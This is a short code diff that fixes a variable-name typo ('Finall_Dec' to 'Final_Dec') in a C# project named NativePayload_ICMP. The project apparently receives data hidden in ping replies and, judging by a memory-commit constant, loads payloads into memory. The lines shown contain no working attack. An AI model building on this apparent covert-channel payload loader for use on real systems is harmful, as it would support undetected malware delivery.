@@ -365,7 +365,7 @@ namespace NativePayload_ICMP
 
         static string _Ping(string IPAddress_DNSName, int counter)
         {
-            string Finall_Dec = "";
+            string Final_Dec = "";
 
             try
             {
@@ -397,7 +397,7 @@ namespace NativePayload_ICMP
                 {
                     if (item.StartsWith("Reply "))
                     {
-                        Finall_Dec = item.Substring(item.Length - 4);                        
+                        Final_Dec = item.Substring(item.Length - 4);                        
                     }
                  // debug
                  // Console.WriteLine(item + "\n"+ s);  
@@ -410,7 +410,7 @@ namespace NativePayload_ICMP
 
                 Console.WriteLine(e.Message);
             }
-            return Finall_Dec;
+            return Final_Dec;
         }
 
         public static UInt32 MEM_COMMIT = 0x1000;
